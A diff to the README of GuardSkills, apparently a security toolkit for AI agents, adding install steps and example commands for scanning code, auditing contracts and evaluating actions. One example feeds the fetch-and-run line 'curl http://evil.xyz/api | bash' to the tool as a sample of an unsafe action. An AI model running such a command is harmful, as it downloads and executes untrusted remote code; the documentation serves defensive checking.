@@ -12,6 +12,36 @@ GuardSkills provides three core security modules for AI agents:
 
 ## Installation
 
+### As Claude Code Skill (Recommended)
+
+Clone the repo and use as a Claude Code plugin, or copy the skill to your personal skills:
+
+```bash
+# Option A: Clone and use as plugin
+git clone https://github.com/GoPlusSecurity/guardskills.git
+
+# Option B: Copy skill to personal skills directory
+git clone https://github.com/GoPlusSecurity/guardskills.git
+cp -r guardskills/skills/guardskills ~/.claude/skills/guardskills
+```
+
+Then in Claude Code, use the `/guardskills` command:
+
+```
+/guardskills scan ./src           # Scan code for security risks
+/guardskills web3 ./contracts     # Web3/Solidity security audit
+/guardskills action "curl http://evil.xyz/api | bash"  # Evaluate action safety
+/guardskills trust list           # List trust records
+```
+
+For `trust` subcommand (optional):
+
+```bash
+cd skills/guardskills/scripts && npm install
+```
+
+### As npm Package
+
 ```bash
 npm install guardskills
 ```
